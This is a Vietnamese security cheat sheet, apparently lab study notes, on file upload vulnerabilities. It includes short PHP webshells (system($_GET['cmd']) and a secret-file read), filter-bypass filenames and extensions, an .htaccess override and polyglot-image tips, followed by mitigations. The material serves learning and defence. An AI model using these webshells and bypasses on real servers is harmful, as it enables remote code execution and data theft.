# 📤 File Upload Vulnerabilities

## 1. 📌 Tổng quan
Lỗ hổng File Upload xảy ra khi ứng dụng web cho phép người dùng tải file lên máy chủ mà không kiểm tra đầy đủ phần mở rộng (Extension), kiểu nội dung (Content-Type) hoặc nội dung thực tế của file, dẫn đến nguy cơ thực thi mã từ xa (RCE) qua webshell hoặc lưu trữ payload độc hại (XSS, XXE).

---

## 2. 💣 Kỹ thuật khai thác & Bypass Filters

### 1. Upload Webshell trực tiếp:
- **PHP Webshell đơn giản:**
  ```php
  <?php echo file_get_contents('/home/carlos/secret'); ?>
  <?php system($_GET['cmd']); ?>
  ```

### 2. Bypass Content-Type Validation:
- Đổi `Content-Type: application/x-php` thành `Content-Type: image/jpeg` hoặc `image/png`.

### 3. Bypass Path Traversal trong tên file:
- Tên file: `..%2fexploit.php` để đưa file ra ngoài thư mục không thực thi mã.

### 4. Bypass Extension Blacklist:
- Sử dụng các extension thay thế: `.php5`, `.phtml`, `.phar`, `.inc`, `.config` (ASP.NET).
- Obfuscation: `exploit.php.jpg`, `exploit.pHp`, `exploit.php%00.png`, `exploit.p.phphp` (khi strip `.php`).

### 5. Override Server Configuration:
- **Apache:** Upload file `.htaccess` với nội dung:
  ```apache
  AddType application/x-httpd-php .l33t
  ```
  Sau đó upload webshell `exploit.l33t`.

### 6. Polyglot File:
- Nhúng payload PHP vào trong metadata hoặc header của file ảnh hợp lệ (dùng exiftool).

---

## 3. 🛡️ Biện pháp phòng chống (Mitigation)
1. **Strict Extension Whitelist:** Chỉ cho phép danh sách đuôi file hợp lệ.
2. **Rename Uploaded Files:** Đổi tên file thành chuỗi ngẫu nhiên (UUID) khi lưu trên ổ đĩa.
3. **Disable Execution:** Vô hiệu hóa quyền thực thi script trong thư mục upload.
4. Sử dụng dịch vụ lưu trữ file riêng biệt (AWS S3, Google Cloud Storage, Azure Blob).
